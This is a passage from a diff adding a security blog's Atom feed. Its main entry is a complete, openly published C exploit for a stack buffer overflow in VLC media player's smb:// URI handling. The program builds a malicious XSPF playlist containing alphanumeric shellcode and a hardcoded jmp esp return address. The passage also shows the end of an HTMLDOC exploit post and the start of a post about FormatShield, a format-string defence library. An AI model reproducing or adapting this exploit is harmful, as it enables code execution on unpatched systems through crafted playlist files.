+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+    &lt;p&gt;&lt;a href=&quot;/posts/htmldoc-html-file-handling-remote-stack-buffer-overflow-exploit-linux.html&quot;&gt;HTMLDOC 'html' File Handling Remote Stack Buffer Overflow Exploit (Linux)&lt;/a&gt; was originally published by Pankaj Kohli at &lt;a href=&quot;&quot;&gt;Pankaj Kohli&lt;/a&gt; on August 20, 2009.&lt;/p&gt;
+  </content>
+</entry>
+
+
+  
+
+<entry>
+  <title type="html"><![CDATA[VLC Media Player 'smb://' URI Handling Remote Buffer Overflow Vulnerability Exploit]]></title>
+  <link rel="alternate" type="text/html" href="/posts/vlc-media-player-smb-uri-handling-remote-buffer-overflow-vulnerability-exploit.html" />
+  <id>/posts/vlc-media-player-smb-uri-handling-remote-buffer-overflow-vulnerability-exploit</id>
+  <published>2009-08-07T08:15:46+08:00</published>
+  <updated>2009-08-07T08:15:46+08:00</updated>
+  <author>
+    <name>Pankaj Kohli</name>
+    <uri></uri>
+    
+  </author>
+  <content type="html">
+    &lt;p&gt;A stack-based buffer overflow exists in the &lt;code&gt;Win32AddConnection&lt;/code&gt; function in &lt;code&gt;modules/access/smb.c&lt;/code&gt; in VideoLAN VLC media player 0.9.9, when running on Microsoft Windows, that allows remote attackers to execute arbitrary code via a long smb URI in a playlist file.&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cm&quot;&gt;/* VLC Media Player &amp;#39;smb://&amp;#39; URI Handling Remote Buffer Overflow Vulnerability Exploit&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;* Reference: http://www.securityfocus.com/bid/35500&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;* Tested on VLC media player 0.8.6f on WinXP SP3&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;* Coded by Pankaj Kohli&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;* http://www.codepwn.com&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;*/&lt;/span&gt;
+ 
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
+ 
+&lt;span class=&quot;c1&quot;&gt;// ASCII shellcode (Display a message box &amp;amp; exit)&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;TY777777777777777777777777777777777QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIXkweaHrJwpf02pQzePMhyzWwSuQnioXPOHuBxKnaQlkOjpJHIvKOYokObPPwRN1uqt5PA&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+ 
+&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7E485233&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// jmp esp (user32.dll)&lt;/span&gt;
+ 
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;512&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+ 
+    &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;sploit.xspf&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;wb&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;&amp;lt;?xml version=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&amp;quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&amp;quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; encoding=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&amp;quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;UTF-8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&amp;quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;&amp;lt;playlist version=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&amp;quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&amp;quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; xmlns=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&amp;quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;http://xspf.org/ns/0/&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&amp;quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; xmlns:vlc=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&amp;quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;http://www.videolan.org/vlc/playlist/ns/0/&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&amp;quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;lt;title&amp;gt;Playlist&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;lt;trackList&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;lt;track&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t\t\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;lt;location&amp;gt;smb://example.com@www.example.com/foo/#{&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+ 
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;[*] Creating buffer&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;300&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;a&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;96&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;300&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;%s&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+ 
+    &lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;}&amp;lt;/location&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t\t\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;lt;extension application=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&amp;quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;http://www.videolan.org/vlc/playlist/0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&amp;quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t\t\t\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;lt;vlc:id&amp;gt;0&amp;lt;/vlc:id&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t\t\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;lt;/extension&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;lt;/track&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;lt;/trackList&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;&amp;lt;/playlist&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;fclose&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+ 
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;[*] Exploit file written to sploit.xspf&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+ 
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+    &lt;p&gt;&lt;a href=&quot;/posts/vlc-media-player-smb-uri-handling-remote-buffer-overflow-vulnerability-exploit.html&quot;&gt;VLC Media Player 'smb://' URI Handling Remote Buffer Overflow Vulnerability Exploit&lt;/a&gt; was originally published by Pankaj Kohli at &lt;a href=&quot;&quot;&gt;Pankaj Kohli&lt;/a&gt; on August 07, 2009.&lt;/p&gt;
+  </content>
+</entry>
+
+
+  
+
+<entry>
+  <title type="html"><![CDATA[FormatShield: A tool to defend against format string attacks]]></title>
+  <link rel="alternate" type="text/html" href="/posts/formatshield.html" />
+  <id>/posts/formatshield</id>
+  <published>2009-06-30T23:14:29+08:00</published>
+  <updated>2009-06-30T23:14:29+08:00</updated>
+  <author>
+    <name>Pankaj Kohli</name>
+    <uri></uri>
+    
+  </author>
+  <content type="html">
+    &lt;p&gt;FormatShield is a library that intercepts call to vulnerable functions and uses binary rewriting to defend against format string attacks. It identifies the vulnerable call sites in a running process and dumps the corresponding context information in the ELF binary of the process. Attacks are detected when format specifiers are found at these contexts of the vulnerable call sites.&lt;/p&gt;
+
+&lt;p&gt;FormatShield provides wrappers for the following libc functions:&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...)&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...)&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...)&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...)&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;va_list&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
